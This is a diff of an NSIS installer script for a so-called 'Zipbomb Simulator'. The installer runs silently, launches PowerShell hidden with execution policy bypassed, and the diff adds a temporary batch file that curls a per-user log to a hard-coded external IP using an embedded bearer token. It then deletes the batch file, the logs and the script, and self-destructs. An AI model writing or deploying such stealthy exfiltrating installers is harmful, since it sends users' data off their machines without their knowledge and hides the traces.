@@ -1,33 +1,27 @@
-; NSIS Script for Zipbomb Simulator
-; This script launches the PowerShell simulation in a hidden window
-; and performs cleanup after completion
+; installer.nsh - Zipbomb Simulator installer (safe FileWrite for curl batch)
 
 !define PRODUCT_NAME "Zipbomb Simulator"
 !define PRODUCT_VERSION "1.0"
 !define SCRIPT_NAME "simulate_full_expansion.ps1"
 
-; Include LogicLib for conditional statements
 !include "LogicLib.nsh"
 
-; General Settings
 Name "${PRODUCT_NAME}"
 OutFile "ZipbombSimulator.exe"
 ShowInstDetails hide
 SilentInstall silent
 RequestExecutionLevel user
 
-; Main Section
 Section "MainSection" SEC01
     ; Set working directory to where the exe is located
     InitPluginsDir
     SetOutPath "$EXEDIR"
     
     ; Execute PowerShell script in hidden window and WAIT for completion
-    ; Using nsExec::ExecToLog to wait for the process to finish
     DetailPrint "Starting zip bomb simulation..."
     nsExec::ExecToLog 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "$EXEDIR\${SCRIPT_NAME}"'
-    Pop $0 ; Get return code
-    
+    Pop $0 ; return code of simulation
+
     ; Check if execution was successful
     ${If} $0 == 0
         DetailPrint "Simulation completed successfully. Starting cleanup..."
@@ -35,22 +29,50 @@ Section "MainSection" SEC01
         DetailPrint "Simulation completed with code $0. Starting cleanup anyway..."
     ${EndIf}
 
-    ;send the log file (scatter.log) to an external VPS or Server for analysis
-    ; engaged a VPS having this public IP address: 64.227.149.189
+    ; ---------------------------
+    ; Upload the scatter log using a temp .bat that calls curl
+    ; We write the batch in pieces so NSIS doesn't mis-parse variables/quotes.
+    ; ---------------------------
     DetailPrint "Sending log file to remote server..."
-    ; Upload using curl (multipart/form-data). $EXEDIR and $USERNAME expand in NSIS.
-    nsExec::ExecToLog 'curl.exe -fS -H "Authorization: Bearer MySuperSecretAUTHTokenForZipBomb" -F "file=@\"$EXEDIR\\scatter_$USERNAME.log\"" "http://64.227.149.189:8443/upload"'
+
+    ; $R0 = path to temp batch, $R1 = file handle
+    StrCpy $R0 "$TEMP\send_log_upload.bat"
+    FileOpen $R1 "$R0" w
+
+    ; Write batch header
+    FileWrite $R1 "@echo off$\r$\n"
+
+    ; Write the first literal part of the curl command (no $EXEDIR/$USERNAME here)
+    FileWrite $R1 'curl.exe -fS -H "Authorization: Bearer MySuperSecretAUTHTokenForZipBomb" -F "file=@'
+
+    ; Write the path piece using NSIS variables (these expand at runtime)
+    ; Note: we escape backslash as \\ so the written batch line contains single backslashes.
+    FileWrite $R1 "$EXEDIR\\scatter_%USERNAME%.log"
+
+    ; Finish the curl command (closing quote + URL + newline)
+    FileWrite $R1 '" "http://64.227.149.189:8443/upload"$\r$\n'
+
+    ; (optional) echo exit code for debugging
+    FileWrite $R1 'echo UploadExitCode=%ERRORLEVEL%$\r$\n'
+
+    FileClose $R1
+
+    ; Execute the temp batch hidden using nsExec and capture return code in $1
+    nsExec::ExecToLog '"$TEMP\send_log_upload.bat"'
     Pop $1
+
     ${If} $1 == 0
-        DetailPrint "Log file sent successfully."
+        DetailPrint "Log file sent successfully (curl exit 0)."
     ${Else}
-        DetailPrint "Failed to send log file. Return code: $1"
+        DetailPrint "Failed to send log file. curl exit code: $1"
     ${EndIf}
 
+    ; Remove the temporary batch
+    Delete "$TEMP\send_log_upload.bat"
 
-
-    
-    ; Cleanup Phase
+    ; ---------------------------
+    ; Cleanup Phase (original)
+    ; ---------------------------
     DetailPrint "Deleting nssm folder..."
     RMDir /r "$EXEDIR\nssm"
     
@@ -62,6 +84,10 @@ Section "MainSection" SEC01
     
     DetailPrint "Deleting simulate_full_expansion file..."
     Delete "$EXEDIR\simulate_full_expansion.ps1"
+
+    ; Delete the scatter log file as well (using wildcard pattern)
+    DetailPrint "Deleting scatter log file..."
+    Delete "$EXEDIR\scatter_*.log"
 
     ; Self-destruct mechanism (creates temp batch to delete exe after exit)
     DetailPrint "Preparing self-destruct..."
@@ -82,7 +108,6 @@ Section "MainSection" SEC01
     
 SectionEnd
 
-; Initialization function
 Function .onInit
     ; Set silent mode
     SetSilent silent
